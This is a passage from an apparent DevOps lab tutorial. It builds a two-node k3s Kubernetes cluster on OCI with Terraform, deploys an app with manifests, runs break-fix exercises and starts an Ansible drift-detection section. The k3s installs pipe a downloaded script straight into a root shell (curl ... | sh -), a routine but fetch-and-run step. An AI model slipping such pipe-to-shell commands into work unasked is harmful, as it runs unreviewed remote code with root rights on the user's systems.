- Open-source Jenkins baseline (speed-run from Phase 1)
- CloudBees CI migration (or open-source plugin equivalent)
- Folder-based RBAC with team isolation
- Configuration as Code (Jenkins config in YAML, version-controlled)
- Audit trail logging (NIST 800-53 AU-2/AU-3)
- Scheduled backup validation pipeline
- Jenkins vs CloudBees comparison documentation

**Interview story you can now tell:**
- "I installed open-source Jenkins, experienced its governance limitations, then migrated to CloudBees CI."
- "The Jenkinsfile syntax is identical — CloudBees adds the compliance layer."
- "I implemented RBAC, CasC, and audit trails — the three features that make Jenkins federal-ready."

**Next:** Phase 2 continues with k3s Kubernetes setup, AIDE file integrity, and the DR drill (Days 3-5).

---

## PHASE 23: K3S KUBERNETES CLUSTER — 2-NODE SETUP (2-3 hrs)

**Day 3 morning**

### What You're Doing and Why

Days 1-2 ran FedAnalytics on a single app-server VM managed by systemd. That works for dev, but it has a single point of failure: if the VM dies, the app dies. Day 3 replaces that single VM with a 2-node Kubernetes cluster running k3s — a lightweight Kubernetes distribution purpose-built for resource-constrained environments.

You won't leave the OCI Always Free tier. The total compute budget is 4 OCPU / 24 GB. Instead of spending 2 OCPU / 12 GB on bastion + app-server, you resize: bastion stays the same (1 OCPU / 6 GB), and the remaining 3 OCPU / 18 GB goes to two k3s nodes (roughly 2 OCPU / 12 GB each). Kubernetes schedules FedAnalytics pods across both nodes, and if one node fails, the other keeps serving traffic.

| What changes on Day 3 | Before | After |
|----------------------|--------|-------|
| App-server VM | 1 instance (1 OCPU / 6 GB) — systemd | Terminated |
| k3s-server node | — | 1 instance (2 OCPU / 12 GB) — Kubernetes control plane + worker |
| k3s-agent node | — | 1 instance (2 OCPU / 12 GB) — Kubernetes worker |
| Total compute used | 2 OCPU / 12 GB | 4 OCPU / 24 GB (free tier maximum) |
| FedAnalytics replicas | 1 (systemd) | 2 (Kubernetes pods, one per node) |

> **🧠 ELI5 — k3s vs full Kubernetes:** Full Kubernetes (kubeadm) needs a control-plane cluster with multiple dedicated manager nodes, etcd storage, and many moving pieces — hard to run on free cloud VMs. k3s is Kubernetes with the heavy parts stripped out and replaced with lighter alternatives (SQLite instead of etcd by default, Traefik stripped in our case). You get 95% of Kubernetes features in a single 70 MB binary. It's the standard choice for edge, IoT, and lab environments.

> **💼 Interview Insight — Why k3s in a federal lab:** "I chose k3s because it runs the full Kubernetes API — `kubectl` commands, deployments, services, ConfigMaps, health checks — everything works identically to EKS or GKE. The difference is resource footprint. k3s runs on our OCI Always Free A1 Flex instances, which means the entire multi-node Kubernetes cluster costs zero dollars. In an interview for an EKS or GKE role, I can walk through the same concepts because the API is the same."

---

### Step 23.1 — Resize Infrastructure for k3s

📍 **Local Terminal (WSL2)**

**Why we terminate the app-server:** The existing app-server (1 OCPU / 6 GB) is too small to run as a k3s node with headroom for pods. Two nodes at 2 OCPU / 12 GB each give Kubernetes meaningful scheduling room. We free up that OCPU budget by terminating the app-server first.

**Update `terraform/main.tf` — remove app_server, add k3s nodes:**

Open your existing `main.tf` and remove the `oci_core_instance.app_server` block entirely. Then append the following two new instance blocks after the bastion definition:

```hcl
# k3s-server: control plane + first worker node
resource "oci_core_instance" "k3s_server_node" {
  availability_domain = var.availability_domain
  compartment_id      = var.compartment_ocid
  display_name        = "k3s-server-node"
  shape               = "VM.Standard.A1.Flex"

  shape_config {
    ocpus         = 2
    memory_in_gbs = 12
  }

  source_details {
    source_type = "image"
    source_id   = var.image_ocid
  }

  create_vnic_details {
    subnet_id        = oci_core_subnet.private_subnet.id
    assign_public_ip = false
    display_name     = "k3s-server-vnic"
    hostname_label   = "k3s-server"
  }

  metadata = {
    ssh_authorized_keys = var.ssh_public_key
    user_data           = base64encode(file("${path.module}/cloud-init/k3s-common.yaml"))
  }

  freeform_tags = {
    "Project"   = "fedanalytics-lab"
    "Role"      = "k3s-server"
    "Day"       = "3"
  }
}

# k3s-agent: pure worker node
resource "oci_core_instance" "k3s_agent_node" {
  availability_domain = var.availability_domain
  compartment_id      = var.compartment_ocid
  display_name        = "k3s-agent-node"
  shape               = "VM.Standard.A1.Flex"

  shape_config {
    ocpus         = 2
    memory_in_gbs = 12
  }

  source_details {
    source_type = "image"
    source_id   = var.image_ocid
  }

  create_vnic_details {
    subnet_id        = oci_core_subnet.private_subnet.id
    assign_public_ip = false
    display_name     = "k3s-agent-vnic"
    hostname_label   = "k3s-agent"
  }

  metadata = {
    ssh_authorized_keys = var.ssh_public_key
    user_data           = base64encode(file("${path.module}/cloud-init/k3s-common.yaml"))
  }

  freeform_tags = {
    "Project"   = "fedanalytics-lab"
    "Role"      = "k3s-agent"
    "Day"       = "3"
  }
}
```

**Update `terraform/outputs.tf` — replace app_server output with k3s outputs:**

```hcl
output "k3s_server_private_ip" {
  description = "k3s server node private IP (control plane)"
  value       = oci_core_instance.k3s_server_node.private_ip
}

output "k3s_agent_private_ip" {
  description = "k3s agent node private IP (worker)"
  value       = oci_core_instance.k3s_agent_node.private_ip
}
```

**Create the cloud-init file** that pre-installs common packages on both nodes:

```bash
mkdir -p ~/oci-federal-lab-phase2/terraform/cloud-init

cat > ~/oci-federal-lab-phase2/terraform/cloud-init/k3s-common.yaml << 'EOF'
#cloud-config
packages:
  - curl
  - wget
  - git
  - python3
  - python3-pip
  - firewalld
package_update: true
runcmd:
  - systemctl enable firewalld
  - systemctl start firewalld
  # k3s required ports — Kubernetes API, flannel VXLAN, kubelet, NodePort range
  - firewall-cmd --permanent --add-port=6443/tcp
  - firewall-cmd --permanent --add-port=8472/udp
  - firewall-cmd --permanent --add-port=10250/tcp
  - firewall-cmd --permanent --add-port=30000-32767/tcp
  - firewall-cmd --reload
EOF
```

> **Why open ports in cloud-init?** The OCI Security List (Terraform-managed) already opens these ports at the network level from Phase 20. The `firewalld` rules are the host-level firewall inside the VM. Both layers must allow traffic — OCI is the outer gate, firewalld is the inner gate.

<sub><em>

| Port | Protocol | Purpose |
|------|----------|---------|
| 6443 | TCP | Kubernetes API server — agents and kubectl connect here |
| 8472 | UDP | Flannel VXLAN overlay — pod-to-pod traffic across nodes |
| 10250 | TCP | Kubelet API — control plane reads node status through this |
| 30000-32767 | TCP | NodePort range — external access to services (our app uses 30080) |

</em></sub>

**Apply the infrastructure change:**

```bash
cd ~/oci-federal-lab-phase2/terraform

# Preview: should show 1 instance destroyed (app_server), 2 instances created (k3s nodes)
terraform plan

# Apply — terminate app-server, create k3s nodes
terraform apply
# Type "yes"
# Expected: "Apply complete! Resources: 2 added, 1 destroyed."

# Capture the new IPs
K3S_SERVER_IP=$(terraform output -raw k3s_server_private_ip)
K3S_AGENT_IP=$(terraform output -raw k3s_agent_private_ip)
echo "k3s server: ${K3S_SERVER_IP}"
echo "k3s agent:  ${K3S_AGENT_IP}"
```

**Update your SSH config:**

```bash
cat >> ~/.ssh/config << SSHEOF

Host k3s-server-node
    HostName ${K3S_SERVER_IP}
    User opc
    IdentityFile ~/.ssh/oci_key
    ProxyCommand ssh -W %h:%p bastion-p2

Host k3s-agent-node
    HostName ${K3S_AGENT_IP}
    User opc
    IdentityFile ~/.ssh/oci_key
    ProxyCommand ssh -W %h:%p bastion-p2
SSHEOF
```

> **ProxyCommand, not ProxyJump:** Some SSH versions on Windows/WSL2 don't parse ProxyJump correctly through multi-hop chains. ProxyCommand with `-W %h:%p` is equivalent but more portable. Both accomplish the same thing: your SSH client connects to the bastion first, then the bastion forwards the connection to the private node.

Wait 2-3 minutes for cloud-init to finish on both nodes, then verify:

```bash
ssh k3s-server-node "hostname && free -h && nproc"
# Expected: k3s-server   12Gi total   2 CPUs

ssh k3s-agent-node "hostname && free -h && nproc"
# Expected: k3s-agent    12Gi total   2 CPUs
```

---

### Step 23.2 — Install k3s Server Node

📍 **k3s-server-node (SSH)**

```bash
ssh k3s-server-node
```

**Install k3s in server mode:**

```bash
curl -sfL https://get.k3s.io | INSTALL_K3S_EXEC="server --disable traefik --flannel-backend=vxlan" sh -
```

<sub><em>

| Part of the command | What it does |
|--------------------|-------------|
| `curl -sfL https://get.k3s.io` | Downloads the k3s installer script. `-s` = silent, `-f` = fail on HTTP error, `-L` = follow redirects. k3s detects the ARM architecture (aarch64) automatically and pulls the correct binary |
| `INSTALL_K3S_EXEC="server ..."` | Tells the installer to run k3s in server (control plane) mode |
| `--disable traefik` | k3s ships with Traefik ingress pre-installed. We disable it because our lab uses NodePort services — Traefik adds complexity we don't need and wastes memory |
| `--flannel-backend=vxlan` | Flannel is the CNI (Container Network Interface) plugin that handles pod networking. VXLAN is the overlay protocol — it wraps pod traffic in UDP packets so pods on different nodes can talk to each other. Required for multi-node clusters |

</em></sub>

**Wait for k3s to start (~30 seconds), then verify:**

```bash
sudo systemctl status k3s
# Expected: active (running)

sudo k3s kubectl get nodes
# Expected: NAME         STATUS   ROLES                  AGE   VERSION
#           k3s-server   Ready    control-plane,master   1m    v1.x.x+k3s1
```

**Retrieve the node join token — the agent needs this to authenticate:**

```bash
sudo cat /var/lib/rancher/k3s/server/node-token
```

Copy the full token string (it looks like `K10abc123...::server:xyz789...`). You will paste this in Step 23.3.

**Copy the kubeconfig to your user account** so you can run kubectl without sudo:

```bash
mkdir -p ~/.kube
sudo cp /etc/rancher/k3s/k3s.yaml ~/.kube/config
sudo chown opc:opc ~/.kube/config
chmod 600 ~/.kube/config

# Verify kubectl works without sudo
kubectl get nodes
```

> **🧠 ELI5 — What is the node token?** Think of it like a WiFi password for the cluster. The k3s server generates a secret token when it starts. Any machine that wants to join the cluster as an agent must present this token. Without it, a rogue VM can't join your cluster and pretend to be a legitimate worker. The token is stored at `/var/lib/rancher/k3s/server/node-token` and should be treated like a password — don't commit it to git.

> **💼 Interview Insight — Control Plane vs Worker:** "In Kubernetes, the control plane makes scheduling decisions — it decides which node runs which pod. Workers (agents) actually run the containers. In a production cluster you'd have 3+ dedicated control-plane nodes for high availability, each running etcd. k3s uses SQLite on a single server node, which is fine for lab and edge workloads. For federal production, you'd want a proper HA control plane with etcd backups, which maps to NIST 800-53 CP-9 contingency planning controls."

---

### Step 23.3 — Join k3s Agent Node

📍 **k3s-agent-node (SSH)**

Open a new terminal window and SSH to the agent node:

```bash
ssh k3s-agent-node
```

**Install k3s in agent mode** — replace the placeholder values with your actual server IP and the token from Step 23.2:

```bash
curl -sfL https://get.k3s.io \
  | K3S_URL="https://YOUR_K3S_SERVER_PRIVATE_IP:6443" \
    K3S_TOKEN="YOUR_NODE_JOIN_TOKEN_FROM_STEP_23_2" \
    sh -
```

<sub><em>

| Environment variable | What it does |
|---------------------|-------------|
| `K3S_URL` | The Kubernetes API server address. The agent contacts the server here to register and receive workload assignments. Uses HTTPS on port 6443 |
| `K3S_TOKEN` | The join token from the server. Proves this agent is authorized to join the cluster |
| (no `INSTALL_K3S_EXEC`) | Omitting this variable tells the installer to run in agent mode automatically when `K3S_URL` is set |

</em></sub>

**Verify the agent joined successfully:**

```bash
sudo systemctl status k3s-agent
# Expected: active (running)
```

**Switch back to the server node** and confirm both nodes are visible:

```bash
# Back on k3s-server-node
kubectl get nodes
```

Expected output:

```
NAME         STATUS   ROLES                  AGE   VERSION
k3s-server   Ready    control-plane,master   5m    v1.x.x+k3s1
k3s-agent    Ready    <none>                 1m    v1.x.x+k3s1
```

Both nodes showing `Ready` means the cluster is healthy and pod scheduling can begin.

> **🧠 ELI5 — What "Ready" means:** Each node runs a process called kubelet that sends heartbeats to the control plane every few seconds. "Ready" means the control plane received a recent heartbeat and the node passed all its self-checks (enough disk, enough memory, network CNI running). "NotReady" means the control plane lost contact — kubelet stopped, the node crashed, or network is broken.

---

### Step 23.4 — Deploy FedAnalytics to k3s

📍 **k3s-server-node (SSH)**

You'll create three Kubernetes manifest files: a ConfigMap for database connection settings, a Deployment that runs 2 FedAnalytics pod replicas, and a Service that exposes the app on NodePort 30080.

**Create the manifests directory:**

```bash
mkdir -p ~/fedanalytics-k8s
cd ~/fedanalytics-k8s
```

**Create `configmap-db-connection.yaml`:**

```bash
cat > configmap-db-connection.yaml << 'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: fedanalytics-db-config
  namespace: default
  labels:
    app: fedanalytics
data:
  # These values are read by the FedAnalytics app as environment variables
  # The actual ADB wallet and credentials are mounted as secrets (see Deployment)
  DB_CONNECT_STRING: "YOUR_ADB_LOW_CONNECTION_STRING"
  DB_USER: "admin"
  APP_ENV: "lab"
  LOG_LEVEL: "INFO"
EOF
```

> **Replace `YOUR_ADB_LOW_CONNECTION_STRING`** with the connection string from your OCI Autonomous Database. Find it in the OCI Console under your ADB → DB Connection → Connection Strings → `*_low`.

**Create `fedanalytics-deployment.yaml`:**

```bash
cat > fedanalytics-deployment.yaml << 'EOF'
apiVersion: apps/v1
kind: Deployment
metadata:
  name: fedanalytics-deployment
  namespace: default
  labels:
    app: fedanalytics
    version: "1.0"
    environment: lab
spec:
  replicas: 2
  selector:
    matchLabels:
      app: fedanalytics
  template:
    metadata:
      labels:
        app: fedanalytics
        version: "1.0"
    spec:
      containers:
        - name: fedanalytics-container
          image: python:3.11-slim
          workingDir: /app
          command: ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "8000"]
          ports:
            - containerPort: 8000
              name: http-api
          env:
            - name: DB_CONNECT_STRING
              valueFrom:
                configMapKeyRef:
                  name: fedanalytics-db-config
                  key: DB_CONNECT_STRING
            - name: DB_USER
              valueFrom:
                configMapKeyRef:
                  name: fedanalytics-db-config
                  key: DB_USER
            - name: DB_PASSWORD
              valueFrom:
                secretKeyRef:
                  name: fedanalytics-db-secret
                  key: db-password
            - name: APP_ENV
              valueFrom:
                configMapKeyRef:
                  name: fedanalytics-db-config
                  key: APP_ENV
          livenessProbe:
            httpGet:
              path: /health
              port: 8000
            initialDelaySeconds: 30
            periodSeconds: 15
            failureThreshold: 3
          readinessProbe:
            httpGet:
              path: /health
              port: 8000
            initialDelaySeconds: 15
            periodSeconds: 10
          resources:
            requests:
              cpu: "250m"
              memory: "256Mi"
            limits:
              cpu: "1000m"
              memory: "512Mi"
      restartPolicy: Always
EOF
```

<sub><em>

| Field | What it does |
|-------|-------------|
| `replicas: 2` | Kubernetes runs 2 pods. With 2 nodes, the scheduler places one pod per node |
| `selector.matchLabels` | The Deployment owns pods with this label. Must match `template.metadata.labels` exactly |
| `configMapKeyRef` | Injects a value from the ConfigMap as an environment variable. The app reads `os.environ["DB_CONNECT_STRING"]` |
| `secretKeyRef` | Injects a value from a Kubernetes Secret. Secrets are base64-encoded in etcd — not encrypted by default, but not visible in plain text in YAML files committed to git |
| `livenessProbe` | Kubernetes hits `/health` every 15 seconds. 3 consecutive failures → container is restarted automatically |
| `readinessProbe` | Kubernetes hits `/health` before adding the pod to service routing. Prevents traffic from reaching a pod that isn't ready yet |
| `resources.requests` | Minimum resources the scheduler needs to find for this pod. Prevents pods from being placed on nodes with insufficient capacity |
| `resources.limits` | Maximum resources the container can use. Prevents one pod from starving others |

</em></sub>

**Create the database password Secret:**

```bash
# Replace YOUR_ADB_ADMIN_PASSWORD with the password from your terraform.tfvars db_admin_password
kubectl create secret generic fedanalytics-db-secret \
  --from-literal=db-password='YOUR_ADB_ADMIN_PASSWORD' \
  --namespace default

# Verify the secret was created (value will be hidden)
kubectl get secret fedanalytics-db-secret -o jsonpath='{.data}' | python3 -m json.tool
```

**Create `fedanalytics-service.yaml`:**

```bash
cat > fedanalytics-service.yaml << 'EOF'
apiVersion: v1
kind: Service
metadata:
  name: fedanalytics-service
  namespace: default
  labels:
    app: fedanalytics
spec:
  type: NodePort
  selector:
    app: fedanalytics
  ports:
    - name: http
      protocol: TCP
      port: 80           # ClusterIP port (pod-to-pod traffic)
      targetPort: 8000   # Port the container listens on
      nodePort: 30080    # External port on every node's IP
EOF
```

> **🧠 ELI5 — NodePort explained:** A NodePort service opens the same port number (30080) on every node's IP address. Whether you hit `k3s-server:30080` or `k3s-agent:30080`, Kubernetes routes your request to one of the running pods. It does not matter which node you connect to — the kube-proxy on each node knows where all pods are and forwards accordingly.

**Apply all three manifests:**

```bash
kubectl apply -f configmap-db-connection.yaml
kubectl apply -f fedanalytics-deployment.yaml
kubectl apply -f fedanalytics-service.yaml

# Watch pods come up
kubectl get pods -o wide --watch
# Ctrl+C when both pods show Running
```

Expected output after ~60 seconds:

```
NAME                                        READY   STATUS    RESTARTS   NODE
fedanalytics-deployment-6d8b9f7c4d-ab1x2   1/1     Running   0          k3s-server
fedanalytics-deployment-6d8b9f7c4d-xy3z4   1/1     Running   0          k3s-agent
```

One pod per node, both `Running` with `READY 1/1`. The `1/1` confirms the readiness probe passed.

```bash
# Verify the service
kubectl get service fedanalytics-service
# Expected: TYPE: NodePort   PORT(S): 80:30080/TCP

# Full deployment status
kubectl rollout status deployment/fedanalytics-deployment
# Expected: "deployment "fedanalytics-deployment" successfully rolled out"
```

> **💼 Interview Insight — Kubernetes Health Checks:** "I configured both liveness and readiness probes on the FedAnalytics deployment. The readiness probe ensures no traffic routes to a pod until the `/health` endpoint returns 200 — important during rolling deployments when old pods are stopping and new ones are starting. The liveness probe auto-restarts containers that lock up but don't crash. In a federal environment these map to NIST 800-53 SI-2 (flaw remediation) because Kubernetes automatically remediates failed containers."

---

### Step 23.5 — Test Multi-Node Networking

📍 **bastion-p2 (SSH)** for external tests; 📍 **k3s-server-node** for internal tests

**From the bastion, test both nodes directly on their NodePort:**

```bash
ssh bastion-p2
```

```bash
# Get the node IPs — replace with your actual values from terraform output
K3S_SERVER_IP="YOUR_K3S_SERVER_PRIVATE_IP"
K3S_AGENT_IP="YOUR_K3S_AGENT_PRIVATE_IP"

# Test the /health endpoint through each node's NodePort
echo "--- Testing k3s-server-node NodePort ---"
curl -s "http://${K3S_SERVER_IP}:30080/health" | python3 -m json.tool

echo "--- Testing k3s-agent-node NodePort ---"
curl -s "http://${K3S_AGENT_IP}:30080/health" | python3 -m json.tool
```

Both should return:

```json
{
    "status": "healthy",
    "timestamp": "2026-04-08T14:30:00Z",
    "version": "1.0.0"
}
```

**Test the /ingest endpoint (POST with JSON payload):**

```bash
curl -s -X POST "http://${K3S_SERVER_IP}:30080/ingest" \
  -H "Content-Type: application/json" \
  -d '{"source": "k3s-test", "payload": {"metric": "cluster_health", "value": 1}}' \
  | python3 -m json.tool
```

**Test /metrics and /logs:**

```bash
curl -s "http://${K3S_SERVER_IP}:30080/metrics" | python3 -m json.tool
curl -s "http://${K3S_SERVER_IP}:30080/logs?limit=5" | python3 -m json.tool
```

**Test pod-to-pod communication via the ClusterIP service** — switch to the k3s-server node:

```bash
ssh k3s-server-node

# Find the ClusterIP of the fedanalytics service
kubectl get service fedanalytics-service
# Note the CLUSTER-IP value (e.g., 10.43.x.x)

CLUSTER_IP=$(kubectl get service fedanalytics-service -o jsonpath='{.spec.clusterIP}')

# Exec into one pod and curl the ClusterIP (internal cluster DNS)
POD_NAME=$(kubectl get pods -l app=fedanalytics -o jsonpath='{.items[0].metadata.name}')

kubectl exec -it ${POD_NAME} -- curl -s "http://${CLUSTER_IP}/health"
# Expected: {"status": "healthy", ...}

# Also test via the service DNS name (Kubernetes internal DNS)
kubectl exec -it ${POD_NAME} -- curl -s "http://fedanalytics-service.default.svc.cluster.local/health"
# Expected: same healthy response
```

> **🧠 ELI5 — ClusterIP vs NodePort:** ClusterIP is the internal-only address. Only pods inside the cluster can reach it. Think of it as the app's internal phone extension — other pods dial it without knowing which physical node the pod lives on. NodePort is the external address — like the front desk number that anyone can call and gets routed to the right extension.

**Verify pods are actually distributed across nodes:**

```bash
kubectl get pods -o wide
# Check the NODE column — one pod should show k3s-server, one should show k3s-agent
```

> **💼 Interview Insight — Multi-Node Networking:** "When I hit the NodePort on the agent node, the request could be served by a pod running on the server node — the kube-proxy uses iptables rules to forward it transparently. Flannel's VXLAN overlay handles the cross-node routing. This is how Kubernetes achieves location-independence: you don't need to know or care where your pod is scheduled. In an interview, I frame this as 'service abstraction over infrastructure' — a core Kubernetes value proposition."

---

### Step 23.6 — Kubernetes Troubleshooting Exercises

These are hands-on break-fix scenarios. Each one simulates a real problem you might face in a federal cloud environment or be asked about in a behavioral interview.

> **How to use these:** Read the "Symptom" first and try to diagnose it yourself before reading the "Root cause" and "Fix". The debugging process matters as much as the answer — practice narrating your thought process aloud.

---

**Exercise 1 of 3 — Pod in CrashLoopBackOff (bad environment variable)**

**Inject the fault:**

```bash
# Patch the deployment with a wrong database password env var
kubectl set env deployment/fedanalytics-deployment DB_PASSWORD="this-is-wrong-on-purpose"
```

**Observe the symptom:**

```bash
kubectl get pods --watch
# After ~30 seconds: STATUS changes from Running → Error → CrashLoopBackOff
```

**Diagnose it:**

```bash
# Step 1: describe the failing pod — look at Events section at the bottom
kubectl describe pod -l app=fedanalytics

# Step 2: check the container logs — this is where the actual Python error appears
FAILING_POD=$(kubectl get pods -l app=fedanalytics --field-selector=status.phase!=Running -o jsonpath='{.items[0].metadata.name}')
kubectl logs ${FAILING_POD}
# Expected: something like "DatabaseError: invalid credentials" or connection refused
kubectl logs ${FAILING_POD} --previous
# --previous shows logs from the last crash (useful when the container restarts too fast to read logs)
```

**Fix it:**

```bash
# Restore the correct password
kubectl create secret generic fedanalytics-db-secret \
  --from-literal=db-password='YOUR_ACTUAL_ADB_ADMIN_PASSWORD' \
  --dry-run=client -o yaml | kubectl apply -f -

# Rollout restart forces pods to pick up the new secret
kubectl rollout restart deployment/fedanalytics-deployment

# Watch recovery
kubectl get pods --watch
# Expected: both pods return to Running within ~60 seconds
```

> **💼 Interview Insight — CrashLoopBackOff:** "CrashLoopBackOff means the container starts, crashes immediately, and Kubernetes keeps trying with exponential backoff — 10 seconds, 20 seconds, 40 seconds. The first thing I do is `kubectl logs <pod-name> --previous` to see the crash reason from the last run. In this case it was an auth failure to the database — a misconfigured secret. In a federal environment, secrets should come from a vault like HashiCorp Vault or OCI Vault, not base64-encoded YAML files, because base64 is not encryption."

---

**Exercise 2 of 3 — Service not routing traffic (wrong selector label)**

**Inject the fault:**

```bash
# Patch the service selector to a label that doesn't exist on any pod
kubectl patch service fedanalytics-service \
  -p '{"spec":{"selector":{"app":"fedanalytics-broken-selector"}}}'
```

**Observe the symptom:**

```bash
# From bastion
curl -s "http://${K3S_SERVER_IP}:30080/health"
# Expected: connection hangs or timeout — no response
```

**Diagnose it:**

```bash
# Step 1: check endpoints — this shows which pods the service is pointing to
kubectl get endpoints fedanalytics-service
# When broken: ENDPOINTS = <none>
# When healthy: ENDPOINTS = 10.42.x.x:8000,10.42.x.x:8000

# Step 2: describe the service — check the Selector field
kubectl describe service fedanalytics-service

# Step 3: check pod labels — confirm what labels pods actually have
kubectl get pods -l app=fedanalytics --show-labels
```

**Fix it:**

```bash
kubectl patch service fedanalytics-service \
  -p '{"spec":{"selector":{"app":"fedanalytics"}}}'

# Verify endpoints reappear
kubectl get endpoints fedanalytics-service
# Expected: two IP:port pairs listed

# Verify traffic flows again
curl -s "http://${K3S_SERVER_IP}:30080/health"
```

> **🧠 ELI5 — Why selectors matter:** A Service is like a receptionist with a guest list. The selector defines the guest list rule — "route to any pod with label `app=fedanalytics`." If you change the rule to `app=fedanalytics-broken-selector` and no pods have that label, the receptionist has an empty guest list and can't route anyone. The Endpoints object is what shows you who's on the current guest list.

---

**Exercise 3 of 3 — Node NotReady (k3s-agent service stopped)**

**Inject the fault:**

```bash
# SSH to the agent node and stop k3s
ssh k3s-agent-node
sudo systemctl stop k3s-agent
exit
```

**Observe the symptom (from k3s-server-node):**

```bash
kubectl get nodes --watch
# After ~40 seconds: k3s-agent STATUS changes from Ready → NotReady

kubectl get pods -o wide
# After ~5 minutes: pod on k3s-agent may show Terminating, Kubernetes will reschedule it to k3s-server
```

**Diagnose it:**

```bash
# On k3s-server-node: check node conditions
kubectl describe node k3s-agent
# Look for: "Ready False" condition and "KubeletStopped" reason in Events

# On k3s-agent-node: check the service status
ssh k3s-agent-node
sudo systemctl status k3s-agent
# Expected: inactive (dead)
sudo journalctl -u k3s-agent -n 30
# Shows the last 30 log lines — look for why it stopped
```

**Fix it:**

```bash
# On k3s-agent-node
sudo systemctl start k3s-agent
sudo systemctl status k3s-agent
# Expected: active (running)
exit

# Back on k3s-server-node — watch node return to Ready
kubectl get nodes --watch
# Expected: k3s-agent → Ready within ~30 seconds

# Pod may have been rescheduled to k3s-server — verify distribution is restored
kubectl get pods -o wide
```

> **💼 Interview Insight — Node NotReady in Production:** "When a Kubernetes node goes NotReady, the control plane waits (by default 5 minutes) before evicting and rescheduling the pods. This grace period exists because transient network blips shouldn't cause mass pod churn. In a federal production cluster running on OCI, I'd configure node-level health monitoring with OCI alarms triggering a PagerDuty notification if a node goes NotReady for more than 2 minutes. That maps to NIST 800-53 SI-4 (system monitoring) — you need automated alerting, not manual discovery."

---

### Phase 23 Troubleshooting

| Symptom | Likely cause | Fix |
|---------|-------------|-----|
| `k3s-agent` node stays `NotReady` after join | Token wrong or firewall blocking 6443 | Verify token exactly (no trailing newline). Check `firewall-cmd --list-ports` on server shows 6443/tcp |
| Pods stuck in `Pending` | Insufficient schedulable resources | `kubectl describe pod <name>` → check Events for "Insufficient cpu/memory". Verify shape_config in Terraform is 2 OCPU / 12 GB |
| `curl -sfL https://get.k3s.io` hangs | Cloud-init blocked outbound traffic | SSH to node and test `curl -I https://get.k3s.io`. Check OCI Security List allows egress. Check internet gateway route in route table |
| `kubectl` command returns `connection refused` | k3s server not running | `sudo systemctl status k3s` on server. If inactive: `sudo systemctl start k3s` |
| Pods run but `/health` returns 502 | App failed to start inside container | `kubectl logs <pod-name>` — look for Python import errors or missing environment variables |
| Both pods scheduled on same node | Kubernetes default behavior | Add `podAntiAffinity` to deployment spec if strict 1-per-node placement is required (optional for this lab) |
| `arm64` binary error during k3s install | Wrong binary architecture detected | k3s installer should auto-detect. Verify with `uname -m` — should return `aarch64`. If not, wrong image OCID |

---

## PHASE 23A: ANSIBLE DRIFT DETECTION (30 min)

**Day 3 afternoon**

### What You're Doing and Why

Your Ansible hardening playbook from Phase 20 applied a baseline configuration to the k3s nodes: firewall rules, sshd settings, file permissions, disabled services. Over time — or immediately after someone makes a manual change — that baseline drifts. Drift detection is how you prove (to auditors, to yourself, to your Jenkins pipeline) that the servers are still in the state Ansible defined.

This is not optional in federal environments. NIST 800-53 CM-6 (Configuration Settings) requires that system configurations are monitored against their approved baselines. Drift detection is the automated implementation of that control.

| Tool | Role | When |
|------|------|------|
| Ansible `--check` mode | Detects what *would* change without changing it | Scheduled: daily or on-demand |
| Ansible `--diff` mode | Shows the before/after of each change | Combined with --check for human-readable reports |
| Drift detection script | Wraps `--check --diff`, saves output, alerts if changes found | Runs from Jenkins or cron |

---

### Step 23A.1 — What is Configuration Drift?

> **🧠 ELI5 — Configuration Drift:** Imagine you set up a perfectly clean desk — everything in its right place. Configuration drift is what happens when a colleague sits at your desk and moves things around, or when a software update changes a file, or when someone "just quickly" adjusts a setting and forgets to document it. Over time your desk looks nothing like your original setup. In servers, drift means the live system no longer matches what your automation code describes. In federal environments, an auditor might show up and ask "prove your servers are configured per your approved baseline." Drift detection gives you the automated answer.

> **Why does drift happen?**

| Cause of drift | Example | How common |
|---------------|---------|-----------|
| Manual emergency fix | SRE SSHs in and changes sshd config to debug an issue | Very common |
| OS package update | RPM update changes a config file default | Common |
| Undocumented runbook | Team member follows old tribal-knowledge steps | Common |
| Attacked system | Attacker modifies configs to persist access | Rare but high-impact |
| Vendor agent install | Monitoring agent changes kernel parameters | Common in enterprise |

> **💼 Interview Insight — Drift Detection and FedRAMP:** "FedRAMP requires continuous monitoring of configuration baselines. I implemented drift detection using Ansible's check mode — it's non-destructive, runs daily from Jenkins, and produces a diff report. If the report shows changes, Jenkins marks the pipeline as unstable and sends an alert. An auditor can pull any day's drift report from our artifact store and see exactly what was in or out of compliance. That's NIST 800-53 CM-6 and SI-2 evidence, produced automatically."

---

### Step 23A.2 — Run Ansible in Check Mode

📍 **Local Terminal (WSL2)**

**Update your Ansible inventory** to include the k3s nodes. Open `~/oci-federal-lab-phase2/ansible/inventory/hosts.ini` and replace the `app_server` entry:

```ini
[bastion]
bastion-p2 ansible_host=YOUR_BASTION_PUBLIC_IP ansible_user=opc ansible_ssh_private_key_file=~/.ssh/oci_key

[k3s_cluster]
k3s-server-node ansible_host=YOUR_K3S_SERVER_PRIVATE_IP ansible_user=opc ansible_ssh_private_key_file=~/.ssh/oci_key ansible_ssh_common_args='-o ProxyCommand="ssh -W %h:%p -i ~/.ssh/oci_key opc@YOUR_BASTION_PUBLIC_IP"'
k3s-agent-node  ansible_host=YOUR_K3S_AGENT_PRIVATE_IP  ansible_user=opc ansible_ssh_private_key_file=~/.ssh/oci_key ansible_ssh_common_args='-o ProxyCommand="ssh -W %h:%p -i ~/.ssh/oci_key opc@YOUR_BASTION_PUBLIC_IP"'

[all_managed_nodes:children]
k3s_cluster
```

**Run the hardening playbook in check mode:**

```bash
cd ~/oci-federal-lab-phase2/ansible

ansible-playbook hardening.yml \
  -i inventory/hosts.ini \
  --check \
  --diff \
  -v
```

<sub><em>

| Flag | What it does |
|------|-------------|
| `--check` | Dry-run mode — Ansible calculates what it would change but makes no actual changes. The system is untouched |
| `--diff` | For any task that would modify a file, shows a unified diff of before → after content |
| `-v` | Verbose output — shows each task as it runs, which host it ran on, and the result |

</em></sub>

**Reading the check mode output:**

```
TASK [Ensure sshd_config PermitRootLogin is no] *****
ok: [k3s-server-node]    ← "ok" means no change needed — baseline is intact
ok: [k3s-agent-node]

TASK [Ensure firewall is enabled and running] *****
changed: [k3s-server-node]   ← "changed" means this WOULD change if --check weren't set
--- before
+++ after
@@ -1,3 +1,3 @@
-state: stopped
+state: started
```

> **Key rule:** In check mode, `ok` = compliant, `changed` = drift detected. A playbook run with `--check` that returns all `ok` means your servers exactly match the Ansible baseline.

**Create a reusable drift detection script:**
